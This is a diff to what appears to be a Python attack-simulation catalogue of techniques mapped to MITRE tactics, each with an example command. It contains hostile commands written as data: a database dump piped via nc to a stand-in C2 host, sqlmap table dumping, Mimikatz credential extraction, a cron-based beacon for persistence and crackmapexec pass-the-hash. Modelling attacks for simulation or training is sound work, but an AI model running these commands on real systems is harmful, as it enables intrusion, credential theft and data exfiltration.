@@ -46,6 +46,22 @@ TECNICAS = [
      'faseRequiere': 'acceso_inicial', 'faseProduce': 'exfiltracion', 'ruido': 'alto', 'facilidadBase': 0.65,
      'descripcion': 'Empaqueta, cifra y extrae la base de datos o documentos sensibles hacia el servidor C2.',
      'comandoEjemplo': 'pg_dump {target} | gpg -c | nc -w 3 c2.darknet 4444'},
+    {'id': 'sqli_dump', 'nombre': 'Inyección SQL & volcado de tablas', 'tacticaMitre': 'TA0001 Initial Access / TA0009 Collection',
+     'faseRequiere': 'recon', 'faseProduce': 'acceso_inicial', 'ruido': 'medio', 'facilidadBase': 0.60,
+     'descripcion': 'Explota fallos de inyección SQL en aplicaciones web para sustraer esquemas, contraseñas y tablas completas.',
+     'comandoEjemplo': 'sqlmap -u http://{target}/api/v1 --batch --dump-all --threads=4'},
+    {'id': 'dump_lsass', 'nombre': 'Volcado de memoria LSASS / Procdump', 'tacticaMitre': 'TA0006 Credential Access',
+     'faseRequiere': 'escalada', 'faseProduce': 'escalada', 'ruido': 'medio', 'facilidadBase': 0.70,
+     'descripcion': 'Extrae hashes NTLM, tokens y contraseñas de la memoria de procesos mediante Mimikatz.',
+     'comandoEjemplo': 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'},
+    {'id': 'persist_backdoor', 'nombre': 'Persistencia y Web Shell / Cron', 'tacticaMitre': 'TA0003 Persistence',
+     'faseRequiere': 'acceso_inicial', 'faseProduce': 'escalada', 'ruido': 'bajo', 'facilidadBase': 0.65,
+     'descripcion': 'Planta una tarea programada o rootkit oculto para resistir terminaciones de procesos.',
+     'comandoEjemplo': 'echo "*/5 * * * * root /bin/c2_beacon" >> /etc/cron.d/sync'},
+    {'id': 'phishing_spray', 'nombre': 'Credential Spraying & Pass-the-Hash', 'tacticaMitre': 'TA0008 Lateral Movement',
+     'faseRequiere': 'recon', 'faseProduce': 'acceso_inicial', 'ruido': 'medio', 'facilidadBase': 0.55,
+     'descripcion': 'Prueba credenciales y hashes obtenidos sobre SMB, WinRM y SSH de hosts vecinos.',
+     'comandoEjemplo': 'crackmapexec smb {target} -u users.txt -H ntlm_hashes.txt'},
 ]
 
 TECNICA_POR_ID = {t['id']: t for t in TECNICAS}
